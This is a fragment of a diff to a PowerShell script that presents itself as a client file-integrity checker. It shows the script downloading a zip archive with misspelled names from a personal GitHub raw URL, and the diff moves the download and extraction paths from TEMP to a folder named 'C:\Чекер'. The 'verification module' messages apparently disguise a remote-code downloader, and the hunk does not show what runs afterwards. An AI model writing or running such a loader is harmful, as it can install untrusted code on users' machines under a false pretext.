@@ -9,8 +9,8 @@ Write-Host "[*] Checking client file integrity..." -ForegroundColor Cyan
 Start-Sleep -Seconds 1
 
 $URL = "https://github.com/kaghohop-gif/chk/raw/refs/heads/main/CHHECK.zip"
-$ZIP = "$env:TEMP\main.zip"
-$EXTRACT = "$env:TEMP\CHECKK-main"
+$ZIP = "C:\Чекер\main.zip"
+$EXTRACT = "C:\Чекер\CHECKK-main"
 
 try {
     Write-Host "[*] Loading verification module..." -ForegroundColor Yellow
